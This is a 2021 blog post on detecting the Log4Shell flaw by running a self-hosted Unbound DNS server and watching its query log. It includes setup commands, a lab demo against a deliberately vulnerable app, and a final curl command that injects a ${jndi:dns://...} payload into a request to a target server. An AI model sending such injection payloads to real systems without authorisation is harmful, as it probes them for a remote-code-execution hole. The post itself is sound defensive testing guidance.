<!DOCTYPE html><html lang="en-GB"><head><meta charset="utf-8"><title>Check Log4Shell vulnerability using Unbound DNS server | Ming Di Leom&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="canonical" href="https://mdleom.com/blog/2021/12/17/log4shell-log4j-unbound-dns/"><meta name="description" content="Check vulnerability without relying on third-party services"><meta property="article:author" content="Ming Di Leom"><meta property="article:tag" content="aws"><meta property="article:tag" content="security"><meta property="og:type" content="article"><meta property="og:title" content="Check Log4Shell vulnerability using Unbound DNS server"><meta property="og:url" content="https://mdleom.com/blog/2021/12/17/log4shell-log4j-unbound-dns/"><meta property="og:site_name" content="Ming Di Leom&#39;s Blog"><meta property="og:description" content="Check vulnerability without relying on third-party services"><meta property="og:locale" content="en_GB"><meta property="og:image" content="https://mdleom.com/screenshot/blog/2021/12/17/log4shell-log4j-unbound-dns/"><meta property="article:published_time" content="2021-12-17T00:00:00.000Z"><meta property="article:modified_time" content="2022-02-12T00:00:00.000Z"><link rel="alternate" href="/atom.xml" title="Ming Di Leom's Blog" type="application/atom+xml"><link rel="icon" href="/favicon.ico"><link rel="icon" href="/svg/favicon.svg" type="image/svg+xml" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon-180x180.png"><link rel="manifest" href="/site.webmanifest"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"><link rel="stylesheet" href="/css/chameleon.css"><meta name="yandex-verification" content="e026a03a5dd06730"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="container" class="container"><article id="post-log4shell-log4j-unbound-dns" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting"><header id="header" class="header"><nav class="main-nav"><a class="main-nav-link" href="/">Home</a> <a class="main-nav-link" href="/blog/">Blog</a> <a class="main-nav-link" href="/about/">About</a> <a class="main-nav-link" href="/atom.xml">Feed</a> <a class="main-nav-link" href="https://gitlab.com/curben/blog" rel="noopener external nofollow noreferrer">GitLab</a><div class="search-container"><form id="searchForm" method="post" action="https://duckduckgo.com/" rel="noopener external nofollow noreferrer" role="search"><input type="search" name="q" class="search-box" placeholder="Search..." title="Powered by DuckDuckGo" enterkeyhint="search"> <input type="hidden" name="sites" value="mdleom.com"> <input type="hidden" name="kd" value="-1"> <input type="hidden" name="kg" value="p"> <input type="hidden" name="kae" value="#000"> <a class="search-button" id="search-click"><img src="/svg/search.svg"></a></form></div></nav><nav class="mobile-nav"><a class="site-title" href="/">mdleom.com</a><ul class="mobile-nav-menu"><label for="mobile-menu-toggle"><a class="no-underline" id="menu-button">&#9776;</a></label> <input id="mobile-menu-toggle" type="checkbox"><ul id="mobile-nav-link"><div class="search-container"><form id="searchFormMob" method="post" action="https://duckduckgo.com/" rel="noopener external nofollow noreferrer" role="search"><input type="search" name="q" class="search-box" placeholder="Search..." title="Powered by DuckDuckGo" enterkeyhint="search"> <input type="hidden" name="sites" value="mdleom.com"> <input type="hidden" name="kd" value="-1"> <input type="hidden" name="kg" value="p"> <input type="hidden" name="kae" value="#000"> <a class="search-button" id="search-click-mobile"><img src="/svg/search.svg"></a></form></div><i>Powered by DuckDuckGo</i> <a class="mobile-nav-link-a" href="/">Home</a> <a class="mobile-nav-link-a" href="/blog/">Blog</a> <a class="mobile-nav-link-a" href="/about/">About</a> <a class="mobile-nav-link-a" href="/atom.xml">Feed</a> <a class="mobile-nav-link-a" href="https://gitlab.com/curben/blog" rel="noopener external nofollow noreferrer">GitLab</a></ul></ul></nav></header><hr class="header-hr"><div class="article-inner"><header class="article-header"><h1 class="p-name entry-title article-title" itemprop="headline name">Check Log4Shell vulnerability using Unbound DNS server <a id="btnshare"><img src="/svg/share.svg"></a></h1></header><p class="p-summary">Check vulnerability without relying on third-party services</p><div class="e-content article-entry" itemprop="articleBody"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup-DNS-server"><span class="toc-text">Setup DNS server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo-vulnerable-app"><span class="toc-text">Demo vulnerable app</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Is-that-server-vulnerable"><span class="toc-text">Is that server vulnerable?</span></a></li></ol><blockquote><p>(Edit: 12 Feb 2022) AWS CDK stack is available at <a href="https://gitlab.com/curben/aws-scripts/-/tree/main/log4shell-stack" rel="noopener external nofollow noreferrer">curben&#x2F;aws-scripts</a></p></blockquote><p>Most of the publications discussing the Log4Shell&#x2F;<a href="https://blogs.apache.org/foundation/entry/apache-log4j-cves" rel="noopener external nofollow noreferrer">Log4j</a> vulnerability (<a href="https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java" rel="noopener external nofollow noreferrer">[1]</a>, <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" rel="noopener external nofollow noreferrer">[2]</a>, <a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/" rel="noopener external nofollow noreferrer">[3]</a>, <a href="https://arstechnica.com/information-technology/2021/12/minecraft-and-other-apps-face-serious-threat-from-new-code-execution-bug/" rel="noopener external nofollow noreferrer">[4]</a>) focus on the ability to instruct the JNDI component to load remote code or download payload using <a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol" rel="noopener external nofollow noreferrer">LDAP</a>. A less known fact is that Log4j also supports DNS protocol by default, at least in versions prior to 2.15.0.</p><p>Huntress, a cyber security company, created an easy-to-use tool at <a href="https://log4shell.huntress.com/" rel="noopener external nofollow noreferrer">log4shell.huntress.com</a> to detect whether your server is vulnerable using LDAP. Despite the assurance of transparency by the availability of <a href="https://github.com/huntresslabs/log4shell-tester" rel="noopener external nofollow noreferrer">source code</a> so you could host it yourself, there’s no denying the fact that log4shell.huntress.com is a <em>third-party</em> service; even if anyone could host it, not everyone has the ability to audit the source code. Another third-party service that is mentioned around is <a href="http://www.dnslog.cn/" rel="noopener external nofollow noreferrer">dnslog.cn</a> which detects (as the name implies) using DNS protocol.</p><p>Since the DNS request made by Log4j is just a simple DNS lookup—similar to a web browser’s request—we can run any kind of DNS server: authoritative or recursive. Recursive DNS server is the easier option because it simply forwards request to upstream authoritative server(s). If a server is vulnerable, we’ll see its IP address in the DNS server’s query logs when we attempt the exploit.</p><h2 id="Setup-DNS-server">Setup DNS server <a href="#Setup-DNS-server" class="headerlink" title="Setup DNS server">§</a></h2><p>Unbound is a popular DNS server due to its simplicity. dnsmasq is another option, it was the default dns caching in Ubuntu before being replaced by systemd-resolved.</p><p>When installing a server (web, DNS, app, etc), Ubuntu usually starts the service immediately after installation. I prefer to properly configure a server before starting it, so I’m going to <em>mask</em> it first to prevent that auto-start.</p><blockquote><p>Except for checking service status, log and dns query, all commands require <code>sudo</code> privilege.</p></blockquote><pre><code class="hljs plaintext">systemctl mask unbound</code><button class="copy-button">Copy</button></pre><p>Above command may fail in a script, in that case, use <code>ln -s /dev/null /etc/systemd/system/unbound.service</code> instead.</p><p>Then, we can proceed to install and configure it.</p><pre><code class="hljs plaintext">apt update
apt install unbound
sudo -e /etc/unbound/unbound.conf.d/custom.conf</code><button class="copy-button">Copy</button></pre><p><em><code>sudo -e</code> is preferred over <code>sudo nano</code> for <a href="https://teddit.net/r/linux/comments/osah05/ysk_do_not_use_sudo_vimnanoemacs_to_edit_a_file/" rel="noopener external nofollow noreferrer">security reason</a>.</em></p><p>Paste the following config.</p><pre><code class="hljs yml"><span class="hljs-comment"># Based on https://www.linuxbabe.com/ubuntu/set-up-unbound-dns-resolver-on-ubuntu-20-04-server</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-comment"># the working directory.</span>
  <span class="hljs-attr">directory:</span> <span class="hljs-string">&quot;/etc/unbound&quot;</span>

  <span class="hljs-comment"># run as the unbound user</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">unbound</span>

  <span class="hljs-comment"># uncomment and increase to get more logging</span>
  <span class="hljs-comment"># verbosity: 2</span>

  <span class="hljs-comment"># log dns queries</span>
  <span class="hljs-attr">log-queries:</span> <span class="hljs-literal">yes</span>

  <span class="hljs-comment"># listen on all interfaces,</span>
  <span class="hljs-attr">interface:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
  <span class="hljs-comment"># comment out to support IPv6.</span>
  <span class="hljs-comment"># interface: ::0</span>
  <span class="hljs-comment"># answer queries from the local network only, change to your private IP</span>
  <span class="hljs-comment"># interface: 192.168.0.2</span>

  <span class="hljs-comment"># perform prefetching of almost expired DNS cache entries.</span>
  <span class="hljs-attr">prefetch:</span> <span class="hljs-literal">yes</span>

  <span class="hljs-comment"># respond to all IP</span>
  <span class="hljs-attr">access-control:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/0</span> <span class="hljs-string">allow</span>
  <span class="hljs-comment"># IPv6</span>
  <span class="hljs-comment"># access-control: ::0/0 allow</span>

  <span class="hljs-comment"># respond to local network only, change the CIDR according to your network</span>
  <span class="hljs-comment"># access-control: 192.168.88.0/24 allow</span>

  <span class="hljs-comment"># localhost only</span>
  <span class="hljs-comment"># access-control: 127.0.0.1/24 allow</span>

  <span class="hljs-comment"># hide server info from clients</span>
  <span class="hljs-attr">hide-identity:</span> <span class="hljs-literal">yes</span>
  <span class="hljs-attr">hide-version:</span> <span class="hljs-literal">yes</span>

<span class="hljs-attr">remote-control:</span>
  <span class="hljs-comment"># Disable unbound-control</span>
  <span class="hljs-attr">control-enable:</span> <span class="hljs-literal">no</span>

<span class="hljs-attr">forward-zone:</span>
  <span class="hljs-comment"># Forward all queries to Quad9, use your favourite DNS</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;.&quot;</span>
  <span class="hljs-attr">forward-addr:</span> <span class="hljs-number">9.9</span><span class="hljs-number">.9</span><span class="hljs-number">.9</span>
  <span class="hljs-attr">forward-addr:</span> <span class="hljs-number">149.112</span><span class="hljs-number">.112</span><span class="hljs-number">.112</span></code><button class="copy-button">Copy</button></pre><p><kbd>Ctrl</kbd> + <kbd>X</kbd> to quit, <kbd>Y</kbd> to save, <kbd>Enter</kbd> to confirm.</p><blockquote><p>With the above config, Unbound will respond to <em>all</em> IP, including <em>public</em> IP if exposed to internet.</p></blockquote><p>Since Unbound will listen on all interfaces, it’ll interfere with systemd-resolved which listens on 127.0.0.53:53 by default. So, before we start Unbound, systemd-resolved needs to be disabled first.</p><pre><code class="hljs plaintext">systemctl disable --now systemd-resolved</code><button class="copy-button">Copy</button></pre><p>We also need to add the server’s hostname to <code>/etc/hosts</code>, otherwise <code>sudo</code> will take a long time to execute. If you’re using AWS EC2, the hostname will be “ip-<em>a</em>-<em>b</em>-<em>c</em>-<em>d</em>“ where <em>abcd</em> is the private IP.</p><pre><code class="hljs plaintext">sudo -e /etc/hosts
# append this line
127.0.0.1 ip-a-b-c-d</code><button class="copy-button">Copy</button></pre><p>The last step before we start the service is to configure the firewall to allow inbound DNS traffic. I recommend not to allow all IP (0.0.0.0, ::0), otherwise you’ll get unwanted traffic. In EC2, that means the attached security group.</p><p>After we configure the firewall, we can proceed to unmask and start the DNS server.</p><pre><code class="hljs plaintext">systemctl unmask unbound
systemctl enable --now unbound</code><button class="copy-button">Copy</button></pre><p>To see whether it’s working, execute some queries:</p><pre><code class="hljs plaintext"># localhost
dig example.com @127.0.0.1

# other machine, same subnet
dig example.com @192.168.0.x

# other machine over internet
dig example.com @public-ip</code><button class="copy-button">Copy</button></pre><p>Verify Unbound is logging queries,</p><pre><code class="hljs plaintext">journalctl -xe -u unbound
# Dec 14 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: 127.0.0.1 example.com. A IN</code><button class="copy-button">Copy</button></pre><p>We are now ready to test Log4shell vulnerability.</p><h2 id="Demo-vulnerable-app">Demo vulnerable app <a href="#Demo-vulnerable-app" class="headerlink" title="Demo vulnerable app">§</a></h2><blockquote><p>This is an optional step to demonstrate Log4shell.</p></blockquote><p>A demo vulnerable is available as a Docker image at <a href="https://github.com/christophetd/log4shell-vulnerable-app" rel="noopener external nofollow noreferrer">christophetd&#x2F;log4shell-vulnerable-app</a>. For best security practice, I recommend:</p><ol><li>Run it in an isolated network or environment.</li><li>Clone (the repo) and build it, instead of running the prebuild image.</li></ol><p>After building the image and just before you run it, configure the relevant firewall to restrict outbound connection to the Unbound DNS server only. If you prefer to use port 80 for the app server, run <code>docker run -p 80:8080 --name vulnerable-app vulnerable-app</code>. Open inbound port 8080 (or port 80) in the firewall.</p><p>To test the app server is reachable, send a test request.</p><pre><code class="hljs plaintext">curl -IL app-server-ip:8080 -H &#x27;X-Api-Version: foo&#x27;</code><button class="copy-button">Copy</button></pre><p>The app server should respond HTTP 200. The header must be <code>X-Api-Version</code> because that’s what configured in the log4shell-vulnerable-app.</p><p>Once the connection is verified, we can now instruct it to make a DNS request to our Unbound DNS.</p><pre><code class="hljs plaintext">curl -L app-server-ip:8080 -H &#x27;X-Api-Version: $&#123;jndi:dns://dns-server-ip/evil-request&#125;&#x27;</code><button class="copy-button">Copy</button></pre><p>In the Unbound’s log, the query should be listed.</p><pre><code class="hljs plaintext">journalctl -xe -u unbound
# Dec 14 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: app-server-ip evil-request. A IN</code><button class="copy-button">Copy</button></pre><p>If you want to see the query log in realtime, <code>journalctl -xe -u unbound -f</code>. If it’s not listed, check the inbound firewall rule applied to the DNS server.</p><h2 id="Is-that-server-vulnerable">Is that server vulnerable? <a href="#Is-that-server-vulnerable" class="headerlink" title="Is that server vulnerable?">§</a></h2><pre><code class="hljs plaintext">curl -L https://target-server-domain -H &#x27;User Agent: $&#123;jndi:dns://dns-server-ip/should-not-show-up-in-the-log&#125;&#x27;</code><button class="copy-button">Copy</button></pre></div><footer class="article-footer"><ul class="article-meta"><li><span class="label">Last Updated:</span> <time class="dt-updated" datetime="2022-02-12T00:00:00.000Z" itemprop="dateModified">12 Feb 2022</time></li><li><span class="label">Published Date:</span> <time class="dt-published" datetime="2021-12-17T00:00:00.000Z" itemprop="datePublished">17 <a href="/blog/2021/12/" title="See December 2021's posts">Dec</a> <a href="/blog/2021/" title="See 2021's posts">2021</a></time></li><li><span class="label">Tag:</span><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/aws/" rel="tag">Aws</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/security/" rel="tag">Security</a></li></ul></li><li><span class="label">Source:</span> <a href="https://gitlab.com/curben/blog/-/blob/master/source/_posts/log4shell-log4j-unbound-dns.md" rel="noopener external nofollow noreferrer">log4shell-log4j-unbound-dns.md</a></li><hr></ul></footer></div><nav id="article-nav" class="article-nav"><span class="article-nav-link-wrap newer"><strong>Newer</strong> <a href="/blog/2021/12/25/nginx-splunk-field-extractor/"><div class="article-nav-title">Parsing NGINX log in Splunk</div></a></span><span class="article-nav-link-wrap older"><strong>Older</strong> <a href="/blog/2021/10/08/cloud-control-config/"><div class="article-nav-title">Managing inventory: AWS Cloud Control vs Config</div></a></span></nav></article></div><footer id="footer" class="post-footer footer"><hr><div id="copyright" class="copyright">&copy; 2018-2024 Ming Di Leom. <a href="https://gitlab.com/curben/blog" rel="noopener external nofollow noreferrer">Powered by </a><a href="https://hexo.io/" rel="noopener external nofollow noreferrer">Hexo</a> with <a href="https://gitlab.com/curben/blog/tree/master/themes/chameleon" rel="noopener external nofollow noreferrer">Chameleon</a> theme.<br>Content is available under <a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="noopener external nofollow noreferrer license" itemprop="license">CC-BY-SA 4.0</a>, unless indicated otherwise.<br><a class="main-nav-link" href="/disclaimer/">Disclaimer</a> <a class="main-nav-link" href="https://stats.uptimerobot.com/1394zup2LQ" rel="noopener external nofollow noreferrer">Status</a> <a class="main-nav-link" href="https://xw226dvxac7jzcpsf4xb64r4epr6o5hgn46dxlqk7gnjptakik6xnzqd.onion/" rel="noopener external nofollow noreferrer">Onion</a> <a class="main-nav-link" href="https://gitlab.com/curben/blog#mirrors" rel="noopener external nofollow noreferrer">Eepsite</a></div></footer><script src="/libs/clipboard-2.0.6.min.js" defer></script><script src="/js/copy-button.js"></script><script src="/js/chameleon.js"></script></body></html>